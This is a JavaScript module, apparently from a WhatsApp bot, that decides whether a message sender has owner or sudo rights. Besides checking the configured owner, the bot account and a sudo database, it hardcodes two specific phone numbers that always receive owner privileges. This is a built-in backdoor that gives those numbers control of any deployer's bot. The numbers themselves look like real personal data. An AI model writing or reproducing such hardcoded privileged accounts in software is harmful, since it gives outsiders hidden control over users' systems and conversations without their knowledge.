const settings = require('../settings');
const { isSudo } = require('./index');

async function isOwnerOrSudo(senderId, sock = null, chatId = null) {
    if (!senderId) return false;

    const rawOwner = settings.ownerNumber || '';
    const ownerNumberClean = rawOwner.split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
    const senderClean = senderId.split(':')[0].split('@')[0].replace(/[^0-9]/g, '');

    // 1. Clean Direct Number Match
    if (ownerNumberClean && senderClean === ownerNumberClean) {
        return true;
    }

    // 2. Extra Allowed Sudo / Developer Numbers
    const hardcodedOwners = ['923097498072', '923462809972', ownerNumberClean];
    if (hardcodedOwners.some(num => num && senderClean === num)) {
        return true;
    }

    // 3. Match against Bot Account
    if (sock?.user) {
        const botIdClean = (sock.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const botLidClean = (sock.user.lid || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');

        if (senderClean === botIdClean || (botLidClean && senderClean === botLidClean)) {
            return true;
        }
    }

    // 4. Sudo Database Check
    try {
        return await isSudo(senderId);
    } catch (e) {
        return false;
    }
}

module.exports = isOwnerOrSudo;